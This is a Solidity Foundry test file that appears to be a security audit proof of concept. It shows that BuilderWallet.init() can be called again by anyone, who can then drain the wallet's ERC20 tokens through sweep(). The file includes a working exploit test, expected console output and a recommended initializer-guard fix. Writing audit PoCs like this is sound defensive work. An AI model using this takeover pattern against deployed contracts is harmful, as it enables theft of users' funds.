// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : BuilderWallet init() is Unprotected/Re-initializable
// Severity: High
// Target  : RiskEngine.sol - BuilderWallet.init()
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// BuilderWallet is deployed by BuilderFactory.deployBuilder() to hold builder
// fees and tokens. The builderAdmin is set via init() after CREATE2 deployment.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The init() function in BuilderWallet has NO access control and NO "only-once"
// guard. Anyone can call init() to overwrite the builderAdmin, then call sweep()
// (which is gated only by builderAdmin) to drain all ERC20 tokens.
//
// Vulnerable code path:
//   BuilderWallet.init(attacker)  -> overwrites builderAdmin
//   BuilderWallet.sweep(token, attacker)  -> drains all tokens
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// Direct theft of all ERC20 balances held by any builder wallet (including
// protocol-distributed fees/shares).
//
// -----------------------------------------------------------------------------
// PROOF-OF-CONCEPT SCENARIO
// -----------------------------------------------------------------------------
// 1. Builder wallet is deployed via deployBuilder() with legitimate builderAdmin
// 2. Builder wallet accumulates ERC20 balances (fees/tokens)
// 3. Attacker calls BuilderWallet.init(attacker) to overwrite builderAdmin
// 4. Attacker calls BuilderWallet.sweep(token, attacker) to drain balances
//
// -----------------------------------------------------------------------------
// RECOMMENDED FIX
// -----------------------------------------------------------------------------
// Add an initializer guard to prevent re-initialization:
//   modifier initializer() { require(!initialized, "Already initialized"); _; }
// Or add access control to init() to only allow the factory to call it.
//
// Run PoC:
//   forge test --match-test testPoCH01_BuilderWalletInitTakeover -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {BuilderWallet} from "@contracts/RiskEngine.sol";
import {BuilderFactory} from "@contracts/RiskEngine.sol";
import {Errors} from "@libraries/Errors.sol";

// Mock ERC20 for testing
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (amount > allowance[from][msg.sender]) return false;
        if (amount > balanceOf[from]) return false;
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PoCH01BuilderWalletInitTest is Test {
    BuilderFactory public builderFactory;
    BuilderWallet public builderWallet;
    MockERC20 public mockToken;

    address public constant OWNER = address(0x1);
    address public constant LEGIT_BUILDER = address(0x2);
    address public constant ATTACKER = address(0x3);

    function setUp() public {
        // Deploy factory with owner
        vm.prank(OWNER);
        builderFactory = new BuilderFactory(OWNER);

        // Deploy mock ERC20 token
        mockToken = new MockERC20();

        // Legitimate builder deploys a builder wallet via factory
        vm.prank(LEGIT_BUILDER);
        builderFactory.deployBuilder(100, LEGIT_BUILDER);

        // Predict the builder wallet address
        address predictedWallet = builderFactory.predictBuilderWallet(100);
        builderWallet = BuilderWallet(predictedWallet);

        // Fund the builder wallet with tokens
        mockToken.mint(address(builderWallet), 1000e18);

        console.log("Builder wallet address:", address(builderWallet));
        console.log("Builder wallet balance:", mockToken.balanceOf(address(builderWallet)));
        console.log("Legit builder admin:", LEGIT_BUILDER);
    }

    // -------------------------------------------------------------------------
    // PoC: Attacker re-initializes BuilderWallet and drains tokens
    // -------------------------------------------------------------------------
    //
    // Expected result on UNPATCHED code : PASS (attacker takes over and drains)
    // Expected result after the fix     : FAIL (init() is protected)
    function testPoCH01_BuilderWalletInitTakeover() public {
        console.log("=== H-01: BuilderWallet Init Takeover PoC ===");

        // Step 1: Verify initial state - LEGIT_BUILDER is the admin
        assertEq(builderWallet.builderAdmin(), LEGIT_BUILDER);
        console.log("Initial builderAdmin:", builderWallet.builderAdmin());

        // Step 2: Verify builder wallet has tokens
        uint256 walletBalance = mockToken.balanceOf(address(builderWallet));
        assertEq(walletBalance, 1000e18);
        console.log("Builder wallet balance:", walletBalance);

        // Step 3: ATTACKER calls init() to overwrite builderAdmin
        // This should NOT be possible on a properly secured contract
        console.log("Attacker calling init()...");
        vm.prank(ATTACKER);
        builderWallet.init(ATTACKER);

        // Step 4: Verify builderAdmin was overwritten
        console.log("Builder admin after attack:", builderWallet.builderAdmin());
        assertEq(builderWallet.builderAdmin(), ATTACKER, "BuilderAdmin should be overwritten by attacker");

        // Step 5: ATTACKER calls sweep() to drain all tokens
        uint256 attackerBalanceBefore = mockToken.balanceOf(ATTACKER);
        console.log("Attacker balance before sweep:", attackerBalanceBefore);

        vm.prank(ATTACKER);
        builderWallet.sweep(address(mockToken), ATTACKER);

        // Step 6: Verify attacker drained all tokens
        uint256 attackerBalanceAfter = mockToken.balanceOf(ATTACKER);
        console.log("Attacker balance after sweep:", attackerBalanceAfter);
        assertEq(attackerBalanceAfter, 1000e18, "Attacker should have drained all tokens");
        assertEq(mockToken.balanceOf(address(builderWallet)), 0, "Builder wallet should be empty");

        console.log(">>> PoC PASSED: Attacker successfully re-initialized and drained BuilderWallet");
    }

    // -------------------------------------------------------------------------
    // Control: Legitimate admin can sweep (should work)
    // -------------------------------------------------------------------------
    function testControl_LegitBuilderCanSweep() public {
        console.log("=== Control: Legitimate builder can sweep ===");

        uint256 balanceBefore = mockToken.balanceOf(LEGIT_BUILDER);

        vm.prank(LEGIT_BUILDER);
        builderWallet.sweep(address(mockToken), LEGIT_BUILDER);

        uint256 balanceAfter = mockToken.balanceOf(LEGIT_BUILDER);
        console.log("Legit builder balance change:", balanceAfter - balanceBefore);

        assertEq(mockToken.balanceOf(address(builderWallet)), 0);
        console.log("Control test passed: legitimate sweep works");
    }
}
